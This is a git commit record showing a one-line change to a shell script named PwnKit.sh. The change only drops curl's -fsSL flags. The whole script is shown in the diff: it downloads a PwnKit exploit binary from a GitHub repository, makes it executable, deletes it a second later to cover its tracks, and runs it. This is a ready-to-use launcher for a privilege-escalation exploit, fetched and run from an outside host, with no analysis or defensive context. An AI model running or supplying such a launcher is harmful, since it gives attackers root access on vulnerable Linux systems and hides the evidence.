43f91e0738c4379d25797edda4f59cf9b3290f14
legevole <54764450+legevole@users.noreply.github.com>
2022-07-21 04:01:04 +0300

    Update PwnKit.sh

--- PwnKit.sh
+++ PwnKit.sh
@@ -1,4 +1,4 @@
-curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit || exit
+curl https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit || exit
 chmod +x ./PwnKit || exit
 (sleep 1 && rm ./PwnKit & )
 ./PwnKit
